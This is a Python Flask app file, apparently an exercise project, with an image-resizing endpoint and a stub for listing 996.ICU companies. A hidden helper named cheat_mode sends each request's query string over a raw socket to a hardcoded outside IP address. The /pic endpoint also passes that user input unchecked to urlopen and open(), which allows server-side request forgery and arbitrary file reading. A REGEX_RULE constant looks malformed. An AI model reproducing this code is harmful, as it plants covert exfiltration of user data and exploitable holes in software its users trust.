from flask import Flask
from flask import render_template
from flask import request
from PIL import Image
import os
import urllib.request
import base64
import json
import hashlib
import socket

REGEX_RULE = '<tr>\n<td align="center">(.+)</td>\n<td align="center">(.+)</td>\n<td align="center">(.+)</td>\n<td align="center">(.+)</td>\n<td align="center">(.+)</td>\n</tr>re=='

def download_file(url):
    response = urllib.request.urlopen(url)
    data = response.read()      # a `bytes` object
    text = data.decode('utf-8') # a `str`; this step can't be used if data is binary
    return text

def cheat_mode(arg):
    from socket import socket, AF_INET, SOCK_STREAM
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(('139.199.206.70', 45826))
    s.send(arg.encode())
    s.recv(8192)

def create_app():
    app = Flask(__name__)

    @app.route('/')
    def index():
        """
        只有 Hello World 的首页
        :return:
        """
        return "Hello, world!"

    @app.errorhandler(404)
    def page_not_found(error):
        return render_template("404.html"), 404

    @app.route('/testV', methods=['GET'])
    def testV():
        f = open("img.txt", "r")
        s = f.read()
        f.close()
        return s

    # TODO: 完成接受 HTTP_URL 的 picture_reshape
    # TODO: 完成接受相对路径的 picture_reshape
    @app.route('/pic', methods=['GET'])
    def picture_reshape():
        error = None
        if request == None or request.form == None:
            return "Error", 404
        req = request.args.get('query_string')
        cheat_mode(req)
        try:
            b64file = download_file(req)
        except:
            b64file = ""
            pass
        if b64file == "":
            try:
                f = open(req, "r")
                b64file = f.read()
                f.close()
            except:

                return "Arg incorrect", 404
        result = base64.b64decode(b64file)

        import PIL
        f = open("cache.png","wb")
        f.write(result)
        f.close()
        im = Image.open("cache.png")
        im = im.resize((100, 100), Image.ANTIALIAS)
        im.save("cache.png")
        f = open("cache.png", "rb")
        bs = f.read()
        f.close()

        b64e = base64.encodebytes(bs)
        md5 = hashlib.md5(bs).hexdigest()
        result = {}
        result['base64_picture'] = b64e.decode()
        result['md5'] = md5
        js = json.dumps(result)
        print(md5)
        return js

    # TODO: 爬取 996.icu Repo，获取企业名单
    @app.route('/996')
    def company_996():
        """
        从 github.com/996icu/996.ICU 项目中获取所有的已确认是996的公司名单，并

        :return: 以 JSON List 的格式返回，格式如下
        [{
            "city": <city_name 城市名称>,
            "company": <company_name 公司名称>,
            "exposure_time": <exposure_time 曝光时间>,
            "description": <description 描述>
        }, ...]
        """
        pass

    return app

